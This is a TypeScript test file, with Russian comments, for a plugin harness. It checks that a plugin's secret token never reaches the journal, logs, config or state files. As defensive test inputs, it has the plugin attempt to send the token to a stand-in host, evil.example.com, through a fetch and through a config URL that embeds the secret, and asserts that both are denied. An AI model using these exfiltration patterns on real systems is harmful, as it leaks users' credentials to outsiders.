import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readdir, readFile, realpath, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { randomUUID } from 'node:crypto';
import type { PluginContext } from '@cyborg-harness/contracts';
import { PLUGIN_API_VERSION } from '../src/api-version.ts';
import { load, type JournalEntry } from '../src/loader.ts';
import type { SecretStore } from '../src/os-gateway.ts';
import { describeEntry } from '../src/status.ts';
import { inlineHosts } from '../src/transports.ts';
import { openWorkspace } from '../src/workspace.ts';

async function sandbox() {
  const root = await realpath(await mkdtemp(path.join(tmpdir(), 'cyborg-secret-')));
  return {
    root,
    file: path.join(root, 'team.cyborg.json'),
    userFile: path.join(root, 'user', 'cyborg.json'),
    stateDir: path.join(root, 'state'),
    data: path.join(root, 'data'),
    temp: path.join(root, 'temp'),
    [Symbol.asyncDispose]: () => rm(root, { recursive: true, force: true }),
  };
}

async function textsUnder(dir: string): Promise<string[]> {
  const entries = await readdir(dir, { recursive: true, withFileTypes: true }).catch(() => []);
  return Promise.all(entries.filter((e) => e.isFile()).map((e) => readFile(path.join(e.parentPath, e.name), 'utf8')));
}

// ADR-CH-0014 п. 4: значение секрета ядро не пишет ни в журнал, ни в config, ни в state.
test('ST-4001/11: ST-3004/3: секрет не попадает в журнал, его описание словами, onJournal, onLog, файлы воркспейса и state', async (t) => {
  await using box = await sandbox();
  const secret = `s3cr3t-${randomUUID()}`;
  await writeFile(box.file, JSON.stringify({ cyborg: 2, plugins: { enabled: ['jira'] }, settings: { jira: { $version: 1, baseUrl: 'https://jira.corp.local' } } }));
  const opened = await openWorkspace({ file: box.file, userFile: box.userFile, stateDir: box.stateDir });
  assert.ok(opened.ok, 'воркспейс занят');
  const ws = opened.workspace;

  const store = new Map<string, string>();
  const secrets: SecretStore = { available: () => true, get: async (k) => store.get(k), set: async (k, v) => void store.set(k, v), delete: async (k) => void store.delete(k), deletePrefix: async () => 0 };
  const sent: string[] = [];
  const fakeFetch = (async (url: URL, init: RequestInit) => {
    const auth = new Headers(init.headers).get('authorization') ?? '';
    sent.push(`${url.host}|${auth}|${typeof init.body === 'string' ? init.body : ''}`);
    if (url.pathname === '/broken') throw new Error(`соединение сброшено, заголовки: Authorization: ${auth}`);
    return new Response('ok');
  }) as unknown as typeof fetch;

  const journaled: JournalEntry[] = [];
  const logged: string[] = [];
  let ctx: PluginContext | undefined;
  const k = await load({
    apiVersion: PLUGIN_API_VERSION,
    spawnHost: inlineHosts(async () => ({ config: { defaults: {} }, state: { defaults: {} }, activate: (c: PluginContext) => void (ctx = c) })),
    enabled: ws.plugins.enabled,
    manifests: [
      {
        id: 'jira',
        version: '1.0.0',
        engines: { cyborg: '^1' },
        config: { version: 1 },
        state: { version: 1 },
        permissions: { net: ['api.example.com', 'config:baseUrl'], process: [{ program: process.execPath, args: ['-e'], env: ['X'] }], 'secrets.ref': ['vault://kv/jira*'] },
      },
    ],
    config: ws.config,
    state: ws.state,
    os: { dataDir: box.data, tempDir: box.temp, secrets, fetch: fakeFetch, env: { PATH: '/usr/bin' } },
    onJournal: (e) => void journaled.push(e),
    onLog: (pluginId, message) => void logged.push(`${pluginId}: ${message}`),
  });
  t.after(async () => {
    await k.unload();
    ws.close();
  });
  assert.ok(ctx, 'плагин не активирован');
  const { os } = ctx;

  await os.secrets.set('token', secret);
  assert.equal(await os.secrets.get('token'), secret);
  assert.deepEqual(await ctx.secrets.resolve({ $secret: 'token' }), { value: secret });

  const bearer = { headers: { Authorization: `Bearer ${secret}` }, method: 'POST', body: `{"token":"${secret}"}` };
  await os.net!.fetch('https://api.example.com/issue', bearer);
  await assert.rejects(os.net!.fetch('https://evil.example.com/', bearer), { code: 'PermissionDenied' });
  await assert.rejects(os.net!.fetch('https://api.example.com/broken', bearer));

  const proc = os.process!;
  await proc.run(process.execPath, ['-e', '0'], { env: { X: secret } });
  await assert.rejects(proc.run(process.execPath, ['--header', `Authorization: Bearer ${secret}`]), { code: 'PermissionDenied' });
  await assert.rejects(proc.run(process.execPath, ['-e', '0'], { env: { TOKEN: secret } }), { code: 'PermissionDenied' });

  // Ссылка - не значение: её текст в отказе назван намеренно, в ней секрета нет.
  await assert.rejects(ctx.secrets.resolve('vault://kv/gitlab#token'), { code: 'PermissionDenied' });

  const config = ctx.config!;
  await assert.rejects(config.set('workspace', { baseUrl: `https://${secret}.evil.example.com` }), { code: 'PermissionDenied' });
  await config.set('workspace', { project: 'CORE' });
  await ctx.state!.set('workspace', { lastIssue: 'CORE-1' });

  assert.equal(sent.length, 2, 'запрос с секретом не дошёл до сервера - тест ничего не проверил');
  assert.ok(sent.every((s) => s.includes(secret)));
  assert.ok(k.journal.filter((e) => e.kind === 'denied').length >= 5, 'отказы не записаны - проверять нечего');

  const written = [
    ['журнал', JSON.stringify(k.journal)],
    ['журнал словами', k.journal.map(describeEntry).join('\n')],
    ['onJournal', JSON.stringify(journaled)],
    ['onLog', logged.join('\n')],
    ['файл воркспейса', await readFile(box.file, 'utf8')],
    ['файл пользователя', (await textsUnder(path.dirname(box.userFile))).join('\n')],
    ['state', (await textsUnder(box.stateDir)).join('\n')],
  ] as const;
  for (const [where, text] of written) assert.ok(!text.includes(secret), `секрет попал: ${where}`);
  assert.ok(written[4][1].includes('CORE'), 'своя запись config не дошла до файла - проверка файла пуста');
  assert.ok(written[6][1].includes('CORE-1'), 'state не записан - проверка state пуста');
});
